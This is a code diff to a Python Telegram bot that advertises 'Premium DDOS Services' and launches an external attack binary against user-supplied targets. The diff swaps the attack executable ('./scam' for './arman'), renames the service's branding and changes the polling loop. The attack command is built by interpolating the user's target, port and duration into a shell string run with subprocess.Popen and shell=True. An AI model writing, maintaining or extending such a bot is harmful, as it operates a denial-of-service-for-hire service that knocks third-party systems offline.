@@ -1,4 +1,3 @@
-
 import telebot
 import subprocess
 import datetime
@@ -275,7 +274,7 @@ def start_attack_reply(message, target, port, time_duration):
     sent_message = bot.reply_to(message, response)
 
     # Start the attack command
-    full_command = f"./scam {target} {port} {time_duration} 200"
+    full_command = f"./arman {target} {port} {time_duration}"
     subprocess.Popen(full_command, shell=True)
 
     # Countdown logic
@@ -362,7 +361,7 @@ def welcome_start(message):
     response = f"""
 ✨ **Welcome, {user_name}!** ✨
 
-🌐 **Premium DDOS Services** of **MR RANDOM** are here to give you the best tools!  
+🌐 **Premium DDOS Services** of **kaira** are here to give you the best tools!  
 🚀 Unleash the power now and experience top-tier performance.
 
 💼 **Need Access? Contact Us Below:**
@@ -450,9 +449,4 @@ def broadcast_message(message):
 
 
 #bot.polling()
-while True:
-    try:
-        bot.polling(none_stop=True)
-    except Exception as e:
-        print(e)
-
+bot.infinity_polling()
